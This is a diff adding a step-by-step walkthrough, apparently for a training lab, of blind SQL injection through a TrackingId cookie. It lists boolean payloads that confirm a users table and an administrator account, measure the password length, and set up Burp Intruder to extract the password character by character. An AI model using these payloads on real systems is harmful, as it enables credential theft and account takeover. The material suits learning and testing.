@@ -1,0 +1,41 @@
+Modify the TrackingId cookie, changing it to:
+TrackingId=xyz' AND '1'='1
+Verify that the "Welcome back" message appears in the response.
+Now change it to:
+TrackingId=xyz' AND '1'='2
+Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
+
+Now:
+Confirm that there is a table called users.
+‘ AND (SELECT ‘a’ FROM users LIMIT 1)=‘a
+Verify that the condition is true, confirming that there is a table called users.
+
+Confirm that there is a user called administrator.
+‘ AND (SELECT ‘a’ FROM users WHERE username=‘administrator’)=‘a
+Verify that the condition is true, confirming that there is a user called administrator.
+
+Determine the length of the password in the administrator user.
+To do that: ‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>1)=‘a
+This condition should be true, confirming that the password is greater than 1 character in length.
+
+Send a series of follow-up values to test different password lengths. Send
+‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>2)=‘a
+Then send:
+‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>3)=‘a
+We can so this by manually by using Burp Repeater.
+OR can do automatically by using Burp Intruder.
+
+In Burp Intruder:
+Choose Payload Type: Numbers
+Change payload settings with Number range 
+From 1 to 25 and step 1
+Place payload position markers around the final a character in the cookie value. To do this, select just the 1, and click the "Add §" button. 
+‘ AND (SELECT ’a’ FROM users WHERE username=‘administrator’ AND LENGTH(password)>§1§)=‘a
+
+Next:
+Change the value of cookie in the position tab of the Burp Intruder.
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+
+Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
